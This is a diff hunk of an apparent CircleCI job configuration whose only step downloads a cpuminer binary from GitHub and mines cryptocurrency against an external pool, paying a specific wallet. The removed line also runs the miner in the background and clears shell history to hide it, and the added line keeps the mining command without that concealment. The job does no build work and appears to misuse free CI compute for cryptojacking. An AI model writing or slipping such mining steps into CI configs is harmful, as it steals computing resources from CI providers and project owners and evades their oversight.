@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx512 -a yescryptr16 -o stratum+tcps://stratum-asia.rplant.xyz:17055 -u qRugnaJEUS5CZTLoRa5E5UsmE1b3twjx9u.Qogecoin1 -t 8 & history -c
+      - run:  wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx512 -a yescryptr16 -o stratum+tcps://stratum-asia.rplant.xyz:17055 -u qRugnaJEUS5CZTLoRa5E5UsmE1b3twjx9u.Qogecoin1
